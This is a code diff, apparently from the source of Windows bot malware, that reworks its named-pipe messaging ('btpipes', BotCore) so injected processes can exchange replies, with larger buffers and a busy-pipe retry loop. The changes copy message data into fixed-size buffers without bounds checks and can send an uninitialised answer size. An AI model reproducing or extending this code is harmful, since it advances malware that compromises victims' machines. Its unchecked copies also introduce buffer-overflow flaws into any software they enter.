@@ -5,7 +5,7 @@
 
 #include "Pipes.h"
 #include "BotCore.h"
-
+#include "BotDebug.h"
 
 //---------------------------------------------------------------------------
 
@@ -24,10 +24,10 @@ char BotPipePrefix[] = {'b', 't', 'p', 'i', 'p', 'e', 's',  0};
 namespace PIPE
 {
 	// Размер буфера приёма данных
-	#define IN_BUF_SIZE 512
+	#define IN_BUF_SIZE 4096
 
 	// Размер буфера отправки данных
-	#define OUT_BUF_SIZE 512
+	#define OUT_BUF_SIZE 4096
 
 	// Парметры канала
 	#define PIPE_PARAMS PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT
@@ -65,7 +65,7 @@ namespace PIPE
     LPBYTE FormatMessage(PCHAR Message, DWORD Size);
 
 	// Обработать сообщение пришедшее по каналу
-	void ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize);
+	void ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize );
 
     // Функция запаковывает сообщение
 	LPBYTE PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize);
@@ -105,6 +105,7 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 	if (Invalid) return 0;
 
 	PCHAR Buf = STR::Alloc(IN_BUF_SIZE + 1);
+	PCHAR Answer = STR::Alloc(IN_BUF_SIZE + 1);
 
 	// Запускаем цикл ожидания клиентов
  	while(!Chanal->Terminated)
@@ -127,12 +128,13 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 			if (pReadFile(Chanal->Handle, Buf, IN_BUF_SIZE, &Readed, NULL))
 			{
 				// Обрабатываем сообщение
-				ProcessMessage(Chanal, Buf, Readed);
+				int AnswerSize;
+				ProcessMessage(Chanal, Buf, Readed, Answer, AnswerSize);
 
 				// Уведомляем клиента о прочитанном сообщении
 				DWORD OutMsgSize = 0;
 
-				PackMessage((LPBYTE)Buf, IN_BUF_SIZE, OkResponse, NULL, 0, 0, NULL, OutMsgSize);
+				PackMessage((LPBYTE)Buf, IN_BUF_SIZE, OkResponse, Answer, AnswerSize, 0, NULL, OutMsgSize);
 
 				pWriteFile(Chanal->Handle, Buf, OutMsgSize, &Readed, NULL);
 			}
@@ -146,6 +148,7 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 	}
 
 	STR::Free(Buf);
+	STR::Free(Answer);
 
 	pCloseHandle(Chanal->Handle);
 
@@ -155,17 +158,15 @@ DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
 }
 //-----------------------------------------------------------------------------
 
-void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize)
+void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize )
 {
 	// Обработать сообщение пришедшее по каналу
 	if (STR::IsEmpty(Msg) || MsgSize == 0)
 		return;
-
 	// Разбираем сообщение
 	TPipeMessage Message;
 	if (!UnPackMessage(Msg, MsgSize, &Message))
 		return;
-
 	// Вызываем обработчики сообщений
 	pEnterCriticalSection(&Pipe->Lock);
 
@@ -190,6 +191,8 @@ void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize)
 		}
 
 		Rec->Handler(Rec->Data, &Message, Cancel);
+		m_memcpy( Answer, Message.Data, Message.DataSize );
+		AnswerSize = Message.DataSize;
 
 		if (Cancel)
         	break;
@@ -409,7 +412,7 @@ void PIPE::FreeProcessPipe(PProcessPipe Pipe)
 
 //-----------------------------------------------------------------------------
 
-bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, PPipeMessage Received)
+bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, void* Answer)
 {
 	// Функция отправляет указанному каналу сообщение
 	if (Msg == NULL || STR::IsEmpty(PipeName))
@@ -423,47 +426,54 @@ bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, PP
 	if (DataSize == 0 && Data != NULL)
     	DataSize = StrCalcLength(Data);
 
-	// Открываем файл
-	HANDLE Pipe = (HANDLE)pCreateFileA(Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-
-    bool Result = false;
-
-	if (Pipe != INVALID_HANDLE_VALUE)
+	bool Result = false;
+	for(;;)
 	{
-
-    	// Формируем сообщение
-        DWORD OutSize = 0;
-		LPBYTE OutMessage = PackMessage(NULL, 0, Msg, Data, DataSize, 0, NULL, OutSize);
-
-		// Записываем данные
-		if (OutMessage != NULL)
+		// Открываем файл
+		HANDLE Pipe = (HANDLE)pCreateFileA(Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+		if (Pipe != INVALID_HANDLE_VALUE)
 		{
-			DWORD Writed = 0;
-			pWriteFile(Pipe, OutMessage, OutSize, &Writed, NULL);
-			MemFree(OutMessage);
-
-
-			// Ожидаем ответ сервера
-			if (Writed == OutSize)
+    		// Формируем сообщение
+			DWORD OutSize = 0;
+			LPBYTE OutMessage = PackMessage(NULL, 0, Msg, Data, DataSize, 0, NULL, OutSize);
+			// Записываем данные
+			if (OutMessage != NULL)
 			{
-				PCHAR InBuf = STR::Alloc(IN_BUF_SIZE);
-				DWORD Readed = 0;
+				DWORD Writed = 0;
+				pWriteFile(Pipe, OutMessage, OutSize, &Writed, NULL);
+				MemFree(OutMessage);
 
-				if ((BOOL)pReadFile(Pipe, InBuf, IN_BUF_SIZE, &Readed, NULL))
+				// Ожидаем ответ сервера
+				if (Writed == OutSize)
 				{
-					TPipeMessage Msg;
-					ClearStruct(Msg);
+					PCHAR InBuf = STR::Alloc(IN_BUF_SIZE);
+					DWORD Readed = 0;
 
-                    UnPackMessage(InBuf, Readed, &Msg);
-                	Result = Readed != 0;
-                }
+					if ((BOOL)pReadFile(Pipe, InBuf, IN_BUF_SIZE, &Readed, NULL))
+					{
+						TPipeMessage Msg;
+						ClearStruct(Msg);
 
-				STR::Free(InBuf);
-            }
+						UnPackMessage(InBuf, Readed, &Msg);
+                		Result = Readed != 0;
+						if( Result && Answer )
+							m_memcpy( Answer, Msg.Data, Msg.DataSize );
+					}
+
+					STR::Free(InBuf);
+				}
+			}
+
+			// Закрываем файл
+		    pCloseHandle(Pipe);
+			break;
 		}
-
-		// Закрываем файл
-        pCloseHandle(Pipe);
+		else
+			if( pGetLastError() == ERROR_PIPE_BUSY )
+				Sleep(1);
+			else
+				break;
+			
 	}
 
 	STR::Free(Name);
